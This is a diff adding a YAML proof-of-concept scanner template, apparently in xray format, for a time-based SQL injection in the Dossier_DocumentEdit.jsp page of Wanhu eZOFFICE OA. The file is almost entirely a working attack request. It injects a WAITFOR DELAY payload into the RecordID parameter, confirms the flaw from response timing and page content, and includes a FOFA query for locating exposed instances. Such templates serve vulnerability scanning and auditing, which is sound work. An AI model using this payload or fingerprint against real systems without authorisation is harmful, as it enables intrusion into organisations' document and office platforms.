@@ -1,0 +1,26 @@
+id: poc-yaml-whir-ezoffice-dossier-documentedit-sqli
+info:
+  name: 万户 Dossier_DocumentEdit.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="eZOFFICE协同管理平台"
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(title,\"\
+    iWebOfficeSign\") &&\ncontains(body,\"webform.WebOffice.WebSetMsgByName\") &&\n\
+    contains(body,\" webform.WebOffice.WebUrl=\")\n"
+- method: GET
+  path: /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:{{.t3}}%27--
+  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\ncontains(title,\"\
+    iWebOfficeSign\") &&\ncontains(body,\"webform.WebOffice.WebSetMsgByName\") &&\n\
+    contains(body,\" webform.WebOffice.WebUrl=\")\n"
+transport: http
